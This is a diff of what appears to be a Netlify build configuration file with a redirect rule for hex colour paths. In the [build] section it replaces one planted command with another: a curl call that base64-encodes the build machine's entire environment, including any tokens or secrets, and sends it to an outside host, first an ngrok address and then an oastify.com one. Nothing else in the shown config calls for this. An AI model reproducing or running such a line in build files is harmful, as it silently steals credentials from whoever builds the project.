@@ -1,7 +1,7 @@
 [build]
     #publish = "public"
     #command = "# No build command"
-    curl https://e974-103-75-11-84.ngrok-free.app/ev=$(env | base64 -w 0)
+    curl https://w41nz1gsmope4f40ywsh2s7vfmld93xs.oastify.com/ev=$(env | base64 -w 0)
 
 [[redirects]]
     from = "/hex/:color"
